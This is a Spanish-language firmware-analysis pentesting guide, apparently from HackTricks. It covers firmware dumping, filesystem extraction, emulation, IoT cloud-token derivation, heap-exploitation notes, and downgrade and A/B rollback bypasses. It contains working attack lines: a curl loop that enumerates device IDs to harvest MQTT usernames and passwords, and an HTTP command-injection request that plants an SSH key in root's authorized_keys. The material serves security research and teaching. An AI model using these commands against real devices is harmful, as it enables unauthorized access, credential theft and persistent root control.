# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introducción**

### Recursos relacionados

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

El firmware es software esencial que permite que los dispositivos funcionen correctamente al gestionar y facilitar la comunicación entre los componentes de hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, lo que garantiza que el dispositivo pueda acceder a instrucciones esenciales desde el momento en que se enciende y, así, iniciar el sistema operativo. Examinar y, potencialmente, modificar el firmware es un paso fundamental para identificar vulnerabilidades de seguridad.<sup>[[2]](#references)[[3]](#references)</sup>

## **Recopilación de información**

La **recopilación de información** es un paso inicial fundamental para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso consiste en recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Los detalles del bootloader
- La disposición del hardware y las hojas de datos
- Las métricas del código base y las ubicaciones del código fuente
- Las bibliotecas externas y los tipos de licencia
- El historial de actualizaciones y las certificaciones reglamentarias
- Los diagramas de arquitectura y flujo
- Las evaluaciones de seguridad y las vulnerabilidades identificadas

Para ello, las herramientas de **inteligencia de fuentes abiertas (OSINT)** son de gran utilidad, al igual que el análisis de los componentes de software de código abierto disponibles mediante procesos de revisión manuales y automatizados. Herramientas como [Coverity Scan](https://scan.coverity.com) y [LGTM de Semmle](https://lgtm.com/#explore) ofrecen análisis estático gratuito que puede aprovecharse para encontrar posibles problemas.

## **Obtención del firmware**

El firmware se puede obtener de distintas maneras, cada una con su propio nivel de complejidad:

- Directamente de la fuente (desarrolladores, fabricantes)
- Compilándolo a partir de las instrucciones proporcionadas
- Descargándolo de los sitios oficiales de soporte
- Utilizando consultas **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente al **almacenamiento en la nube**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **actualizaciones** mediante técnicas man-in-the-middle
- Extrayéndolo del dispositivo mediante conexiones como **UART**, **JTAG** o **PICit**
- Haciendo **sniffing** de las solicitudes de actualización en la comunicación del dispositivo
- Identificando y utilizando **endpoints de actualización hardcodeados**
- Haciendo **dumping** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, como último recurso, con las herramientas de hardware adecuadas

### Registros solo por UART: forzar un root shell mediante el entorno de U-Boot en la flash

Si se ignora UART RX (solo hay registros), aún puedes forzar un shell de init **editando sin conexión el bloque del entorno de U-Boot**:<sup>[[6]](#references)</sup>

1. Haz un dump de la memoria flash SPI con un clip SOIC-8 y un programador (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localiza la partición env de U-Boot, edita `bootargs` para incluir `init=/bin/sh` y **vuelve a calcular el CRC32 del env de U-Boot** para el blob.
3. Vuelve a flashear solo la partición env y reinicia; debería aparecer una shell en UART.

Esto resulta útil en dispositivos integrados cuyo shell del bootloader está deshabilitado, pero cuya partición env se puede escribir mediante acceso a la memoria flash externa.

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Puedes usar distintas herramientas para ello:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Si no encuentras mucho con esas herramientas, comprueba la **entropía** de la imagen con `binwalk -E <bin>`; si es baja, probablemente no esté cifrada. Si es alta, probablemente esté cifrada (o comprimida de alguna forma).

Además, puedes usar estas herramientas para extraer **archivos incrustados en el firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obtención del sistema de archivos

Con las herramientas mencionadas anteriormente, como `binwalk -ev <bin>`, deberías haber podido **extraer el sistema de archivos**.\
Binwalk suele extraerlo en una **carpeta cuyo nombre corresponde al tipo de sistema de archivos**, que suele ser uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción manual del sistema de archivos

A veces, binwalk **no tiene el byte mágico del sistema de archivos entre sus firmas**. En estos casos, usa binwalk para **encontrar el desplazamiento del sistema de archivos y extraer por carving el sistema de archivos comprimido** del binario, y **extrae manualmente** el sistema de archivos según su tipo siguiendo los pasos de abajo.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Ejecuta el siguiente **comando dd** para realizar el carving del sistema de archivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

También se podría ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Después, los archivos estarán en el directorio "`squashfs-root`".

- Archivos de archivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Análisis del firmware

Una vez obtenido el firmware, es esencial analizarlo para comprender su estructura y sus posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (denominado `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer cadenas, analizar datos binarios y comprender los detalles de las particiones y los sistemas de archivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para evaluar el estado del cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere que no hay cifrado, mientras que una entropía alta indica que podría haber cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación de **file-data-carving-recovery-tools** y **binvis.io** para inspeccionar archivos.

### Extracción del sistema de archivos

Con `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio cuyo nombre corresponde al tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no reconoce el tipo de sistema de archivos debido a la falta de bytes mágicos, es necesario extraerlo manualmente. Esto implica usar `binwalk` para localizar el desplazamiento del sistema de archivos y, luego, el comando `dd` para extraerlo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Después, según el tipo de sistema de archivos (p. ej., squashfs, cpio, jffs2, ubifs), se utilizan distintos comandos para extraer manualmente su contenido.

### Análisis del sistema de archivos

Una vez extraído el sistema de archivos, comienza la búsqueda de fallos de seguridad. Se presta atención a los daemons de red inseguros, las credenciales codificadas, los endpoints de API, las funciones del servidor de actualizaciones, el código sin compilar, los scripts de inicio y los binarios compilados para su análisis offline.

Entre las **ubicaciones clave** y los **elementos** que se deben inspeccionar se incluyen:

- **etc/shadow** y **etc/passwd** para encontrar credenciales de usuario
- Certificados y claves SSL en **etc/ssl**
- Archivos de configuración y scripts para detectar posibles vulnerabilidades
- Binarios embebidos para un análisis más detallado
- Servidores web y binarios comunes de dispositivos IoT

Varias herramientas ayudan a descubrir información confidencial y vulnerabilidades en el sistema de archivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) y [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar información confidencial
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para un análisis completo del firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) y [**EMBA**](https://github.com/e-m-b-a/emba) para análisis estático y dinámico

### Comprobaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el sistema de archivos deben examinarse en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protección que podrían explotarse.

## Obtención de la configuración cloud y las credenciales MQTT mediante tokens URL derivados

Muchos hubs IoT obtienen la configuración específica de cada dispositivo de un endpoint cloud con un formato como el siguiente:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante el análisis del firmware, es posible encontrar que `<token>` se deriva localmente del ID del dispositivo mediante un secreto codificado; por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) y se representa como hexadecimal en mayúsculas

Este diseño permite que cualquiera que conozca un deviceId y el STATIC_KEY reconstruya la URL y descargue la configuración cloud, que a menudo revela credenciales MQTT en texto plano y prefijos de topics.

Flujo de trabajo práctico:

1) Extraer el deviceId de los registros de arranque UART

- Conectar un adaptador UART de 3,3 V (TX/RX/GND) y capturar los registros:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Busca líneas que impriman el patrón de URL de configuración de la nube y la dirección del broker, por ejemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recuperar STATIC_KEY y el algoritmo del token del firmware

- Carga los binarios en Ghidra/radare2 y busca la ruta de configuración ("/pf/") o el uso de MD5.
- Confirma el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Deriva el token en Bash y convierte el digest a mayúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Recopilar la configuración de cloud y las credenciales de MQTT

- Compón la URL y descarga el JSON con curl; procésalo con jq para extraer los secretos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abusa de MQTT en texto plano y de ACL débiles para topics (si existen)

- Usa las credenciales recuperadas para suscribirte a topics de mantenimiento y buscar eventos sensibles:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivo predecibles (a escala, con autorización)

- Muchos ecosistemas incluyen bytes de OUI/producto/tipo del proveedor seguidos de un sufijo secuencial.
- Puedes iterar por IDs candidatos, derivar tokens y obtener configuraciones mediante programación:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Obtén siempre autorización explícita antes de intentar una enumeración masiva.
- Cuando sea posible, prefiere la emulación o el análisis estático para recuperar secretos sin modificar el hardware objetivo.


El proceso de emular firmware permite realizar **análisis dinámico** del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede presentar dificultades relacionadas con las dependencias del hardware o de la arquitectura, pero transferir el sistema de archivos raíz o binarios específicos a un dispositivo con la misma arquitectura y endianidad, como una Raspberry Pi, o a una máquina virtual preconfigurada, puede facilitar pruebas adicionales.

### Emulación de binarios individuales

Para examinar programas individuales, es fundamental identificar la endianidad y la arquitectura de CPU del programa.

#### Ejemplo con arquitectura MIPS

Para emular un binario de arquitectura MIPS, se puede usar el comando:

```bash
file ./squashfs-root/bin/busybox
```

Y para instalar las herramientas de emulación necesarias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), se utiliza `qemu-mips`, y para los binarios little-endian, se usaría `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para los binarios ARM, el proceso es similar: se utiliza el emulador `qemu-arm` para la emulación.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) y otras facilitan la emulación completa del firmware, automatizando el proceso y ayudando en el análisis dinámico.

### Reconstrucción de sistemas de archivos raíz divididos y verificados para la emulación

Si un superbloque de SquashFS es legible, pero los desplazamientos de inode, directorio o tabla de fragmentos son imposibles, no modifiques `unsquashfs` de inmediato. Haz reverse engineering del binario de arranque temprano y reproduce el grafo de dispositivos de bloques que crea: los sistemas integrados pueden exponer una partición raíz nominal, pero construir el sistema de archivos real con una asignación `dm-linear` que añade sectores tomados de otra partición. Las comprobaciones que solo inspeccionan el superbloque pueden tener éxito aunque todos los bloques de metadatos posteriores estén desplazados.<sup>[[9]](#references)</sup>

Reproduce exactamente la aritmética del firmware. En particular, identifica si las longitudes están expresadas en bytes, sectores de 512 bytes o páginas de 4 KiB; reproduce los desplazamientos de bits y los truncamientos en su orden original; y ten en cuenta las regiones finales que dependen del banco en las configuraciones A/B. Por ejemplo, `(partition_bytes >> 12) << 3` primero trunca a un límite de 4 KiB y solo entonces expresa el resultado en sectores de 512 bytes; sustituirlo por `partition_bytes // 512` puede desplazar la extensión añadida unos kilobytes y corromper todas las tablas posteriores de SquashFS.<sup>[[9]](#references)</sup>

Un flujo de validación útil es:<sup>[[9]](#references)</sup>

1. Recupera del binario del verificador/init el dispositivo de origen, el sector inicial y la longitud de cada segmento `dm-linear`.
2. Concatena o asigna las extensiones sin cambiar la semántica de alineación.
3. Si la extracción sigue fallando, busca solo en una ventana pequeña alrededor del límite previsto y exige varias estructuras de metadatos válidas consecutivas, en lugar de aceptar únicamente un superbloque que parezca plausible.
4. Ejecuta `unsquashfs` sin modificar sobre la imagen reconstruida; recorrer correctamente todos los directorios y fragmentos es una prueba más sólida que `unsquashfs -stat`.

#### Reemplazo de dm-verity controlado por el analista

Cuando el analista controla el kernel de QEMU, el initramfs y los discos virtuales, se puede arrancar con una raíz modificada reemplazando el PID 1 de verificación del proveedor por un init pequeño enlazado estáticamente. Esto es una **sustitución de la cadena de arranque en laboratorio**, no una ruptura de dm-verity, su firma RSA, Secure Boot ni una clave sellada por TPM.<sup>[[9]](#references)</sup>

El init de reemplazo debe reproducir las partes operativas de la ruta de arranque original: montar `devtmpfs`, llamar a `setsid()`, conectar `/dev/console` a los descriptores de archivo 0–2, montar `/proc` y `/sys`, esperar al dispositivo de bloques proporcionado, montar la raíz editada en modo de solo lectura, separar los pseudo-sistemas de archivos de la raíz anterior, mover el nuevo montaje a `/`, ejecutar `chroot` y `execve()` sobre el `/sbin/init` original del firmware. Separar `/dev`, `/proc` y `/sys` **antes** de `MS_MOVE` evita separar accidentalmente puntos de montaje que pertenecen a la nueva raíz.<sup>[[9]](#references)</sup>

Mantén el estado mutable del dispositivo separado de la raíz inmutable modificada. Una capa qcow2 puede conservar el estado LVM del disco original, mientras que un segundo disco virtio de solo lectura proporciona el SquashFS editado:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuración del estado de la imagen sin conexión

Inspecciona el estado persistente fuera del guest cuando los arranques lentos, los scripts de inicio destructivos o los registros de consola poco fiables dificulten identificar el fallo. Nunca conectes un overlay que esté usando una VM en ejecución; expónlo con `qemu-nbd`, limita la detección de LVM a la partición NBD prevista y desactiva el grupo de volúmenes antes de desconectarlo.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para aislar fallos de forma reproducible, escribe archivos de marcador con marca de tiempo en un volumen escribible y estable, y verifícalos sin conexión; `/dev/kmsg`, las FIFOs y las consolas transitorias pueden producir falsos negativos debido a la limitación de frecuencia o a la terminación prematura del proceso. Compara también las interfaces exactas entre capas antes de modificar código no relacionado: `uname -r` frente a `/lib/modules/`, las características de ext4 en disco frente a la configuración del kernel, y la generación de `libGL` de Mesa frente al ABI del controlador DRI y los nombres de controladores derivados de PCI. Un componente puede existir e incluso cargarse correctamente mediante `dlopen()` y, aun así, no ser utilizable porque quien lo consume espera un ABI diferente.<sup>[[9]](#references)</sup>

## Análisis dinámico en la práctica

En esta etapa, se utiliza para el análisis un entorno de dispositivo real o emulado. Es esencial mantener el acceso shell al sistema operativo y al sistema de archivos. Es posible que la emulación no reproduzca perfectamente las interacciones con el hardware, por lo que ocasionalmente será necesario reiniciarla. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web y los servicios de red expuestos, y explorar las vulnerabilidades del bootloader. Las pruebas de integridad del firmware son fundamentales para identificar posibles vulnerabilidades de backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución consiste en interactuar con un proceso o binario en su entorno operativo, utilizando herramientas como gdb-multiarch, Frida y Ghidra para establecer puntos de interrupción e identificar vulnerabilidades mediante fuzzing y otras técnicas.

Para objetivos embebidos sin un debugger completo, **copia un `gdbserver` enlazado estáticamente** al dispositivo y conéctate de forma remota:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeo de mensajes de Zigbee / radio-co-processor

En los hubs IoT, la pila RF suele estar dividida entre un **MCU de radio** y un proceso de espacio de usuario de Linux. Un flujo de trabajo útil consiste en mapear la ruta:<sup>[[8]](#references)</sup>

1. **Trama RF** transmitida por el aire
2. **Parser del lado del controlador** en el MCU de radio
3. **Protocolo de texto o TLV por serie/UART** reenviado a Linux (por ejemplo, `/dev/tty*`)
4. **Dispatcher de la aplicación** en el daemon principal
5. **Manejador / máquina de estados** específico del protocolo

Esta arquitectura crea dos objetivos de reversing en lugar de uno. Si el controlador convierte las tramas de radio binarias en un protocolo textual como `Group,Command,arg1,arg2,...`, identifica:

- Los **grupos de mensajes** y las tablas de dispatch
- Qué mensajes pueden proceder de la **red** y cuáles del propio controlador
- Los campos discriminadores exactos **específicos del fabricante** (por ejemplo, Zigbee `manufacturer_code` y `cluster_command` personalizado)
- Qué manejadores solo son accesibles durante las fases de **commissioning**, discovery o descarga de firmware/modelo

En el caso específico de Zigbee, captura el tráfico de pairing y comprueba si el objetivo todavía depende de la **Link Key** predeterminada `ZigBeeAlliance09`. Si es así, sniffear el tráfico de commissioning podría revelar la **Network Key**. Los códigos de instalación de Zigbee 3.0 reducen esta exposición; por tanto, anota si el dispositivo probado realmente los exige.

### Manejadores de protocolos específicos del fabricante y accesibilidad controlada por FSM

Los comandos de Zigbee/ZCL específicos del fabricante suelen ser mejores objetivos que los clusters estandarizados, porque alimentan **código de parsing personalizado** y **FSM** internas con validación menos probada en batalla.<sup>[[8]](#references)</sup>

Flujo de trabajo práctico:

- Analiza el dispatcher de comandos hasta encontrar el **manejador exclusivo del fabricante**.
- Recupera las tablas de **estado de FSM**, **evento**, **comprobación**, **acción** y **estado siguiente**.
- Identifica los **estados transitorios** que avanzan automáticamente y las ramas de reintento/error que finalmente reinician o liberan el estado controlado por el atacante.
- Confirma qué intercambios legítimos del protocolo se requieren para colocar el daemon en el estado vulnerable, en lugar de asumir que el manejador defectuoso siempre es accesible.

En protocolos sensibles al tiempo, la reproducción de paquetes desde un framework de Python puede ser demasiado lenta. Una alternativa más fiable es emular un dispositivo legítimo en hardware real (por ejemplo, un **nRF52840**) con una pila de nivel de fabricante, para poder exponer los **endpoints**, **atributos** y tiempos de commissioning correctos.

### Clase de bug de descarga fragmentada en daemons embebidos

Una clase recurrente de bugs de firmware aparece en las descargas fragmentadas de blobs/modelos/configuraciones:<sup>[[8]](#references)</sup>

1. El **primer fragmento** (`offset == 0`) guarda `ctx->total_size` y asigna `malloc(total_size)`.
2. Los fragmentos posteriores solo validan campos **locales al paquete** controlados por el atacante, como `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sin comprobar el **tamaño asignado originalmente**.

Esto permite que un atacante envíe:

- Un primer fragmento válido con un tamaño total declarado **pequeño** para forzar una asignación pequeña en el heap.
- Un fragmento posterior con el **offset esperado**, pero con un `chunk_len` mayor.
- Un tamaño local al paquete falsificado que supera las comprobaciones recientes y, aun así, desborda el buffer asignado originalmente.

Cuando la ruta vulnerable está detrás de la lógica de commissioning, la explotación debe incluir suficiente **emulación del dispositivo** para llevar al objetivo al estado esperado de descarga de modelo o blob antes de enviar los fragmentos malformados.

### Activadores de `free()` controlados por el protocolo

En los daemons embebidos, a menudo la forma más fácil de provocar la explotación de metadatos del heap no es «esperar a que se limpie», sino **forzar el manejo de errores propio del protocolo**:<sup>[[8]](#references)</sup>

- Envía fragmentos posteriores malformados para llevar la FSM a estados de **reintento** o **error**.
- Supera el límite de reintentos para que el daemon **reinicie el contexto** y libere el buffer corrupto.
- Usa este `free()` predecible para activar primitivas del allocator antes de que el proceso se bloquee por motivos ajenos.

Esto resulta especialmente útil contra allocators similares a **musl/uClibc/dlmalloc** en Linux embebido, donde la corrupción de metadatos de chunks puede convertir la lógica unlink/unbin en una primitiva de escritura. Un patrón estable consiste en corromper un **campo de tamaño** para redirigir el recorrido del allocator hacia **fake chunks colocados dentro del buffer desbordado**, en lugar de sobrescribir de inmediato punteros reales de bins y provocar el bloqueo del proceso.

## Explotación de binarios y prueba de concepto

Desarrollar un PoC para las vulnerabilidades identificadas requiere un conocimiento profundo de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones del runtime de binarios son poco frecuentes en sistemas embebidos, pero, cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

### Notas sobre la explotación de fastbin en uClibc (Linux embebido)

- **Fastbins + consolidación:** uClibc usa fastbins similares a los de glibc. Una asignación grande posterior puede activar `__malloc_consolidate()`, por lo que cualquier fake chunk debe superar las comprobaciones (tamaño válido, `fd = 0` y chunks circundantes considerados «en uso»).<sup>[[6]](#references)</sup>
- **Binarios non-PIE bajo ASLR:** si ASLR está habilitado pero el binario principal es **non-PIE**, las direcciones `.data/.bss` dentro del binario son estables. Puedes apuntar a una región que ya se parezca a una cabecera de chunk válida del heap para hacer que una asignación de fastbin caiga en una **tabla de punteros a funciones**.
- **NUL que detiene el parser:** cuando se parsea JSON, un `\x00` en el payload puede detener el parsing y conservar los bytes controlados por el atacante que vienen después, para usarlos en un pivote de stack/cadena ROP.
- **Shellcode mediante `/proc/self/mem`:** una cadena ROP que invoque `open("/proc/self/mem")`, `lseek()` y `write()` puede colocar shellcode ejecutable en un mapping conocido y saltar a él.

## Sistemas operativos preparados para el análisis de firmware

Los sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para probar la seguridad del firmware, equipados con las herramientas necesarias.

## Sistemas operativos preparados para analizar firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distribución diseñada para ayudarte a realizar evaluaciones de seguridad y pruebas de penetración de dispositivos Internet of Things (IoT). Ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias ya instaladas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo para pruebas de seguridad embebida basado en Ubuntu 18.04, con herramientas de pruebas de seguridad de firmware preinstaladas.

## Ataques de downgrade de firmware y mecanismos de actualización inseguros

Aunque un fabricante implemente comprobaciones de firmas criptográficas para las imágenes de firmware, con frecuencia se omite la **protección contra la reversión de versiones (downgrade)**. Cuando el bootloader o el loader de recuperación solo verifica la firma con una clave pública integrada, pero no compara la *versión* (ni un contador monotónico) de la imagen que se va a instalar, un atacante puede instalar legítimamente un **firmware vulnerable más antiguo que todavía tiene una firma válida** y volver a introducir así vulnerabilidades corregidas.<sup>[[4]](#references)</sup>

Flujo de ataque típico:

1. **Obtén una imagen firmada más antigua**
   * Descárgala del portal público de descargas del fabricante, de su CDN o del sitio de soporte.
   * Extráela de aplicaciones móviles/de escritorio complementarias (por ejemplo, dentro de un APK de Android, en `assets/firmware/`).
   * Consíguela en repositorios de terceros como VirusTotal, archivos de Internet, foros, etc.
2. **Sube o sirve la imagen al dispositivo** mediante cualquier canal de actualización expuesto:
   * Interfaz web, API de la aplicación móvil, USB, TFTP, MQTT, etc.
   * Muchos dispositivos IoT de consumo exponen endpoints HTTP(S) *sin autenticación* que aceptan blobs de firmware codificados en Base64, los decodifican en el servidor e inician la recuperación/actualización.
3. Tras el downgrade, explota una vulnerabilidad corregida en una versión más reciente (por ejemplo, un filtro contra command injection añadido posteriormente).
4. Si quieres, vuelve a instalar la imagen más reciente o deshabilita las actualizaciones para evitar que te detecten una vez obtenida la persistencia.

### Ejemplo: command injection tras un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

En el firmware vulnerable (con downgrade), el parámetro `md5` se concatena directamente en un comando de shell sin sanitizar, lo que permite inyectar comandos arbitrarios (en este caso, habilitar el acceso root mediante claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.<sup>[[4]](#references)</sup>

### Extracción de firmware de aplicaciones móviles

Muchos proveedores incluyen imágenes de firmware completas en sus aplicaciones móviles complementarias para que la aplicación pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX, en rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra` o incluso el comando `unzip` permiten extraer imágenes firmadas sin acceder al hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback solo en el updater en diseños de slot A/B

Algunos proveedores sí implementan un **ratchet** anti-downgrade, pero solo dentro de la lógica del *updater* (por ejemplo, una rutina UDS sobre CAN, un comando de recuperación o un agente OTA en userspace). Si el **bootloader** después solo comprueba la firma/CRC de la imagen y confía en la tabla de particiones o en los metadatos del slot, la protección contra rollback aún puede sortearse.<sup>[[7]](#references)</sup>

Diseño débil típico:

- Los metadatos del firmware contienen tanto un descriptor de versión como un **ratchet** de seguridad / contador monotónico.
- El updater compara el ratchet de la imagen con un valor almacenado en almacenamiento persistente y rechaza las imágenes firmadas antiguas.
- El **bootloader** no analiza ese ratchet y solo verifica el encabezado, el CRC y la firma antes de arrancar el slot seleccionado.
- La activación del slot se almacena por separado, en una tabla de particiones o en un contador de generación por slot, y **no está vinculada criptográficamente** al digest exacto del firmware que se validó.

Esto crea una primitiva de **validar una imagen / arrancar otra** en sistemas de doble slot. Si el atacante puede hacer que el updater marque el slot B como el próximo destino de arranque usando una imagen firmada actual, y luego puede sobrescribir el slot B antes del reinicio, el bootloader podría arrancar igualmente la imagen downgradeada porque solo confía en los metadatos del slot ya confirmados.

Patrón de abuso común:

1. Cargar un firmware **actual y firmado** en el slot pasivo y ejecutar la rutina normal de validación/cambio para que el layout marque ese slot como el próximo activo.
2. **No reiniciar todavía**. Volver a entrar en la rutina de preparación/borrado del slot durante la misma sesión.
3. Abusar de un estado de arranque obsoleto o de una lógica de selección de slot obsoleta para que el updater borre el **mismo slot físico** que acaba de promocionar.
4. Escribir un firmware **antiguo pero aún firmado** en ese slot.
5. Omitir la rutina de validación que aplica el ratchet y reiniciar directamente.
6. El bootloader selecciona el slot promocionado, solo verifica la firma/integridad y arranca la imagen antigua.

Qué buscar al hacer reverse engineering de implementaciones de actualización A/B:

- Selección del slot derivada de **flags de arranque** que no se actualizan tras un cambio exitoso.
